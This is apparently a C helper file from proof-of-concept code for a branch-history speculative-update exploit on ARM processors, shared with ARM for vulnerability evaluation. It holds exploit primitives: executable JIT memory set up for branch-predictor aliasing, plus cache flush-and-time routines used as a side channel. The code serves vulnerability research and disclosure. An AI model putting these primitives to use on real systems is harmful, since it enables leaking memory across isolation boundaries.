/*
 * PoC Codes for Branch History Speculative Update Exploitation
 * 
 * Sunday, November 3rd 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include "utils.h"
#include "jit_snippets.h"
#include "target.h"

uint64_t os_page_size;
#define MASK_IN_PAGE_OFFSET (os_page_size-1)

void get_os_params()
{
    os_page_size = getpagesize();
}

void gen_jit_mem_handler(jit_obj_t *jit_obj, void* entry, void* addr, uint64_t size, enum ALLOC_METHOD method)
{
    if (jit_obj)
    {
        jit_obj->call_entry = entry;
        jit_obj->mem_addr = addr;
        jit_obj->mem_size = size;
        jit_obj->alloc_method = method;
    }
}

void del_jit_mem_handler(jit_obj_t *jit_obj)
{
    switch (jit_obj->alloc_method)
    {
    case ALLOC_MALLOC:
        free(jit_obj->mem_addr);
        break;
    case ALLOC_MMAP:
        munmap(jit_obj->mem_addr, jit_obj->mem_size);
        break;
    default:
        break;
    }
}

uint32_t *prep_ret_mem(register void *base_addr, register uint64_t size, int interval, int offset, jit_obj_t *jit_obj)
{
    if (offset>interval) offset = 0;
    void *ret_mem = mmap(base_addr, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (interval == 0)
    {
        for (int i = 0; i < size; i += OPCODE_SIZE)
        {
            memcpy(&ret_mem[i], &jit_ret, OPCODE_SIZE);
        }
    }
    else
    {
        for (int i = 0; i < size; i += OPCODE_SIZE)
        {
            if (i % interval == offset)
                memcpy(&ret_mem[i], &jit_ret, OPCODE_SIZE);
            else
                memcpy(&ret_mem[i], &jit_nop, OPCODE_SIZE);
        }
    }

    __clear_cache(ret_mem, ret_mem + size);
    gen_jit_mem_handler(jit_obj, ret_mem, ret_mem, size, ALLOC_MMAP);
    return ret_mem;
}

uint32_t *prep_fp_offsets(register uint64_t fp_mask, register int64_t fp_bits, register uint8_t fp_lsh, register uint64_t length, jit_obj_t *jit_obj)
{
    uint32_t buf_size = length * sizeof(uint32_t);
    register uint32_t fp_bits_gen;
    register uint32_t rand_bits;
    register uint32_t rand_mask = ((1 << IB_RET_MEM_RANGE) - 1) & OPCODE_ADDR_MASK & ~fp_mask;
    register uint32_t *mem_offsets = malloc(buf_size);
    // srand(time(NULL));
    for (register int i = 0; i < length; i++)
    {
        fp_bits_gen = (fp_bits >= 0) ? fp_bits : i;
        fp_bits_gen = (fp_bits_gen << fp_lsh) & fp_mask;

        rand_bits = rand() & rand_mask;
        // rand_bits = 0;
        // __rand_bits = 0;
        // rand_bits |= (i & 3) << (PATH_FP_DST_LSH + PATH_FP_DST_BITS);
        // rand_bits |= (i & 3) << (PATH_FP_DST_LSH + PATH_FP_DST_BITS * 2);
        // rand_bits = rand_bits & rand_mask;
        
        mem_offsets[i] = rand_bits | fp_bits_gen;
    }

    gen_jit_mem_handler(jit_obj, NULL, mem_offsets, buf_size, ALLOC_MALLOC);
    return mem_offsets;
}

void* prep_aligned_snippets(void *base, uint64_t offset_align_src, void *snippet, uint64_t offset_align_snippet, uint64_t len_snippet, uint64_t n_const_lsb, jit_obj_t *jit_obj)
{
    void *mem;
    void *writeptr;
    uint64_t mask_flip = (1 << n_const_lsb);
    uint64_t mask_lower = mask_flip - 1;
    uint64_t mask_higher = ~mask_lower ^ mask_flip;

    uint64_t addr_align_src = (uint64_t) base + offset_align_src;
    int64_t offset_diff = offset_align_snippet - offset_align_src;
    uint64_t addr_request = ((uint64_t)base - offset_diff) ^ mask_flip;
    uint64_t offset_snippet_in_page = addr_request & MASK_IN_PAGE_OFFSET;
    uint64_t mem_size = (offset_snippet_in_page + len_snippet + os_page_size) & (~MASK_IN_PAGE_OFFSET);

    while (true)
    {
        mem = mmap((void*)addr_request, mem_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
        writeptr = mem + offset_snippet_in_page;
        uint64_t addr_align_jit = (uint64_t) writeptr + offset_align_snippet;
        // let's check:
        // lower bits should keep consistent
        // the higher 1 bit should be flipped
        bool lower_eq = ((addr_align_src ^ addr_align_jit) & mask_lower) == 0;
        bool higher_lsb_flip = ((addr_align_src ^ addr_align_jit) & mask_flip) != 0;
        if (lower_eq && higher_lsb_flip)
            break;
        // returned address does not match the conditions, try requesting next address
        addr_request += (1 << n_const_lsb);
        munmap(mem, mem_size);
    }

    memcpy(writeptr, snippet, len_snippet);
    __clear_cache(writeptr, writeptr + len_snippet + OPCODE_SIZE);

    gen_jit_mem_handler(jit_obj, writeptr, mem, mem_size, ALLOC_MMAP);
    return (void*)writeptr;
}

#define NANOSECONDS_PER_SECOND 1000000000L
uint64_t read_cycles()
{
    struct timespec tp;
    clockid_t clk_id = CLOCK_REALTIME;

    clock_gettime(clk_id, &tp);
    /*printf("tp.tv_sec : %ld\n", tp.tv_sec);
      printf("tp.tv_nsec: %ld\n", tp.tv_nsec); */
    return (uint64_t)((tp.tv_sec * NANOSECONDS_PER_SECOND) + tp.tv_nsec);
}

uint64_t mem_access_time(register volatile void *p)
{
    register uint64_t __cycles;
    __cycles = read_cycles();
    MEM_ACCESS(p);
    WAIT_ALL_OPS_RETIRE(0);
    return (read_cycles() - __cycles);
}


void test_mem_latency(uint8_t *probe_ptr, uint64_t rounds, uint64_t *cycles_fast, uint64_t *cycles_slow)
{
    register uint64_t __cycles_slow = 0;
    register uint64_t __cycles_fast = 0;
    // volatile uint8_t* probe_ptr = &cache_probe_mem[192];
    // memset(cache_probe_mem, 0x41, 256*SIZE_CACHE_STRIDE);
    *probe_ptr = 0x41;

    read_cycles();

    for (int i = 0; i < rounds; i++)
    {
        WAIT_ALL_OPS_RETIRE(64);
        MEM_FLUSH_DC_CIVAC(probe_ptr);
        WAIT_ALL_OPS_RETIRE(64);
        __cycles_slow += mem_access_time(probe_ptr);
    }

    WAIT_ALL_OPS_RETIRE(64);

    for (int i = 0; i < rounds; i++)
    {
        WAIT_ALL_OPS_RETIRE(64);
        MEM_ACCESS(probe_ptr);
        WAIT_ALL_OPS_RETIRE(64);
        __cycles_fast += mem_access_time(probe_ptr);
    }

    WAIT_ALL_OPS_RETIRE(64);

    *cycles_slow = __cycles_slow;
    *cycles_fast = __cycles_fast;
}


void populate_cbhb_no_inline(int n)
{
    NOP_PADDING(32);
    for (register int j = 0; j < n; j++)
    {
        NOP_PADDING(32);
        if (j<0)
        {
            NOP_PADDING(32);
        }
    }
    NOP_PADDING(32);
}